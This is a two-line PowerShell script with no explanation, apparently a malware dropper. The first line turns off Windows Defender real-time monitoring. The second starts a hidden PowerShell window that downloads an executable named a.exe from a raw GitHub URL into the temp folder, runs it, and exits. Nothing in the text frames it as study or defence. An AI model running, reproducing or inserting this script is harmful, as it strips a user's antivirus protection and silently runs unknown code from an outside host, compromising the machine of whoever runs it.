Set-MpPreference -DisableRealtimeMonitoring $true
Start-Process -FilePath "powershell" -ArgumentList "/c cd $Env:temp;Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sxcrate/utils/main/a.exe' -OutFile 'a.exe'; Start-Process -FilePath '.\a.exe'; exit" -WindowStyle Hidden; exit
